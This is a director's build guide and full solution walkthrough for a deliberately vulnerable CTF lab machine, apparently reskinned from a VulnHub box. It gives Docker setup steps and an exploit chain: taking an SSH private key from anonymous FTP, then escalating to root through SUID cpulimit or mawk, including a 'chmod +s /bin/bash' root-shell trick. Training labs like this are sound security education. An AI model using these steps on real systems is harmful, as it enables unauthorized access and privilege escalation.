# AM-02: Wellness Observation Center — Director Build Guide

> **EYES ONLY — DIRECTORS.** This document contains the full exploit
> chain. Do not distribute to players. Player-facing material is in
> `PLAYER_BRIEF.md`.

## Overview

| | |
|---|---|
| Difficulty | Easy |
| Source shape | VulnHub OnSystem ShellDredd #1: Hannah (reskinned — see `../../AM_SOURCING.md`) |
| Base image | `debian:11-slim` |
| Services | FTP (21, vsftpd anonymous), SSH (22, OpenSSH key-only), HTTP (8080, Apache decoy) |
| Intended path | Anonymous FTP → steal SSH key → SSH lateral → SUID binary privesc |
| CP | User 150, Root 200 |
| Flags | `DZ{user_wellness_<hash>}`, `DZ{root_wellness_<hash>}` (per-event) |
| Lore | Fragment B — transfer log in `/home/wellness/transfer_logs/archive_status.log` |

---

## Build & Run

```bash
cd Anomaly_Machines/AM-02_wellness

# Mint per-event flags (from the Anomaly_Machines/ root):
cd ../ && ./generate_flags.sh && cd AM-02_wellness

# Set the flags as env vars for compose:
export AM02_USER_FLAG="$(python3 -c "import json;print(json.load(open('../event_flags.json'))['AM-02: Wellness Observation Center — User Flag'])")"
export AM02_ROOT_FLAG="$(python3 -c "import json;print(json.load(open('../event_flags.json'))['AM-02: Wellness Observation Center — Root Flag'])")"

# Build and start (dev — avoids host port collisions with AM-01):
docker compose -f docker-compose.yml -f docker-compose.dev.yml up -d --build
docker compose logs -f
```

Dev port map (avoids collisions):
- `2121:21` — FTP
- `2223:22` — SSH (AM-01 uses 2222 in dev)
- `8080:8080` — HTTP decoy

Production behind the VPN publishes to `10.10.1.20` on the native ports
(21, 22, 8080).

### Running without minted flags (dev/test)

The compose file ships placeholder flags. The container runs, but flag
validation against the scoring engine won't match. For a local smoke
test, placeholders are fine.

---

## Exploit Chain — Full Walkthrough

Target: `localhost` (dev) or `10.10.1.20` (VPN-side in production).

### Stage 1 — Enumerate

```bash
nmap -sV -sC localhost   # dev (ports 2121, 2223, 8080)
# or in production:
nmap -sV -sC 10.10.1.20
# 21/tcp   open  ftp     vsftpd (anonymous login enabled)
# 22/tcp   open  ssh     OpenSSH
# 8080/tcp open  http    Apache (decoy page)
```

### Stage 2 — HTTP decoy (misdirection)

```bash
curl http://localhost:8080/
# "Citizens are reminded that the Wellness Observation Center does
#  not exist. This facility does not exist. Please proceed."
```

This is a rabbit hole — a static QUORUM flavor page with no foothold.
It exists to reward players who enumerate everything but shouldn't
distract from the FTP service.

### Stage 3 — Anonymous FTP → steal SSH key

```bash
ftp localhost   # dev port 2121; production port 21
# login: anonymous
# password: (blank)

ftp> ls
# drwxr-xr-x  public/

ftp> cd public
ftp> ls
# notice.txt

ftp> ls -la
# drwxr-xr-x  .wellness/

ftp> cd .wellness
ftp> ls
# id_rsa

ftp> get id_rsa
ftp> bye

chmod 600 id_rsa
```

### Stage 4 — SSH lateral + user flag

```bash
ssh -i id_rsa -p 2223 wellness@localhost    # dev; production: -p 22 wellness@10.10.1.20
# shell as wellness
cat ~/user.txt
# DZ{user_wellness_<hash>}
```

### Stage 5 — SUID enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/cpulimit
# /usr/bin/mawk
# (plus standard Debian SUID binaries)
```

### Stage 6a — Privesc Route A: cpulimit (root shell)

```bash
/usr/bin/cpulimit -l 100 -f chmod +s /bin/bash
/bin/bash -p
# id -> uid=0(root)
cat /root/root.txt
# DZ{root_wellness_<hash>}
```

`cpulimit -l 100 -f <cmd>` forks the target command while retaining
SUID-root euid. `-l 100` allows full CPU (no throttling). The forked
`chmod +s /bin/bash` sets the SUID bit on bash; `bash -p` preserves the
effective UID, dropping into a root shell.

### Stage 6b — Privesc Route B (alternate): mawk (read flag directly)

```bash
/usr/bin/mawk '//' /root/root.txt
# DZ{root_wellness_<hash>}
```

`mawk` running as euid-root reads `/root/root.txt` and prints it. No
root shell needed — just read the flag. (Alternatively, use mawk to
rewrite `/etc/shadow` per the GTFOBins mawk SUID technique for a full
root shell.)

### Stage 7 — Lore Fragment B (THE DISCONNECT)

```bash
cat ~/transfer_logs/archive_status.log
```

Contains dated citizen transfer records to "Archive Status" and, near
the end, Fragment B — a recovered annotation confirming the surface is
habitable and QUORUM is lying about it.

---

## Validation (automated)

Run the exploit-chain test suite from the repo root:

```bash
cd Anomaly_Machines/AM-02_wellness
docker compose -f docker-compose.yml -f docker-compose.dev.yml --profile test up --build --abort-on-container-exit
```

Or run the test runner manually against an already-running AM-02:

```bash
docker build -t dz-test-runner ../_test_runner
cd ../  # Anomaly_Machines/
./generate_flags.sh
docker run --rm --network host \
  -v "$(pwd):/machines:ro" \
  -e TARGET_SSH_PORT=2223 \
  dz-test-runner am-02 localhost /machines/event_flags.json
```

Expected output: `PASS: N  FAIL: 0` and `QUORUM has reviewed this audit.
Compliance is confirmed.`

---

## Hardcoded values (per-event changes)

| Value | Where | Notes |
|---|---|---|
| `AM02_USER_FLAG` / `AM02_ROOT_FLAG` | env vars (compose) | Minted by `generate_flags.sh` |
| SSH keypair | baked at build (Dockerfile `RUN ssh-keygen`) | Regenerates on each `--build`; the stolen key matches the image's `authorized_keys` |
| wellness user | Dockerfile | Key-only auth; password locked via `passwd -l` |

---

## Reskinning notes (vs. source Hannah box)

- Hostname → `wellness-observation`, MOTD → QUORUM flavor
- SSH moved from nonstandard port 61000 → 22 (per `AM_SOURCING.md:49`)
- HTTP 8080 decoy added (not in source) — static QUORUM "this facility does not exist" page; pure misdirection, no foothold
- FTP hidden dir nested one level deeper: `public/.wellness/id_rsa` instead of source's `.hannah/id_rsa` at FTP root — adds one enumeration step
- Lore Fragment B planted in `/home/wellness/transfer_logs/archive_status.log` (THE DISCONNECT faction objective)
- Two SUID routes preserved from the source box: `cpulimit` (Route A, intended) and `mawk` (Route B, alternate)
- Base image: `debian:11-slim` (source was Debian 10 Buster; Bullseye chosen for current support — SUID technique verified to work identically)